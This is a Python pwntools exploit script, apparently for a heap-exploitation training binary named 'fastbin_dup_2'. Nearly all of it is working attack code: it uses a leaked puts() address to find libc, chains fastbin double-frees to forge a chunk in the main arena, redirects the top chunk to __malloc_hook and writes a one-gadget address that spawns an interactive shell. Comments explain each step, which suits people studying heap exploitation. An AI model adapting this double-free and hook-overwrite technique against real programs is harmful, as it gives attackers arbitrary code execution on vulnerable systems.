#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again
context.terminal = ['qterminal', '-e', '/usr/bin/python3']

gs = '''
init-pwndbg
'''
# continue


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0


# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1
"""
We use the fastbin dup technique here to write a size value 0x61 to a fastbin. This will act
as the size field for the fake chunk we will try to make/allocate. This field will be written into the main
arena since it starts with some things and then the fastbin linked lists.
"""
chunk_A = malloc(0x48, b"A" * 8)
chunk_B = malloc(0x48, b"B" * 8)
free(chunk_A)
free(chunk_B)
free(chunk_A)
malloc(0x48, p64(0x61))  # Key element (size field)
malloc(0x48, b"C" * 8)
malloc(0x48, b"D" * 8)
"""
This allocates a value in the next 8 bytes to the size field from before
This in effect creates a chunk with a size field wherein there are now also viewed
as fastbins.

Be sure to debug stuff like this using dq &main_arena and fastbins
pwndbg> fastbins 
fastbins
0x50: 0x61
0x60: 0x555555603100 —▸ 0x5555556030a0 —▸ 0x7ffff7bb4b80 (main_arena+32) ◂— 0x555555603100 # A circular linked list due to exploiting a double free bug
"""
chunk_E = malloc(0x58, b"E" * 8)
chunk_F = malloc(0x58, b"F" * 8)
free(chunk_E)
free(chunk_F)
free(chunk_E)
malloc(0x58,p64(libc.sym.main_arena +0x20))  #+0x20 lands us just on the quadword containing the size field

"""
The below is to do two mallocs to be skip E and F's writes. We then try to override the top_chunk address with malloc_hook's
address. The caveat is that we do -35 so as to use a size smaller than 0x21000 to bypass top_chunk integrity checks.
The size initially is 0x7ff but it changes with subsequent allocations.

Then 6 p64(0)s are just to fill the fastbin space to write the malloc_hook-35 address to the top_chunk.
Then, we add 19 nulls to fill more space to accurately write our one-gadget's address in the right aligment and therefore, location.
Note that, [rsp+50] according to one-gadget conditions was not null. But that's fine since we control the stack indirectly and thus
can fill the argument array with out own data (the two mallocs below are just flags u can give to dash or sh)
"""
malloc(0x58, b"-s\x00")
malloc(0x58, b"stdin\x00")


malloc(0x58, p64(0) * 6 + p64(libc.sym.__malloc_hook - 35))
malloc(0x20, b"\x00" * 19 + p64(libc.address + 0xe1fa1))
malloc(1, b"") #Call malloc to call malloc_hook with the one-gadget address to get us a shell

io.interactive()
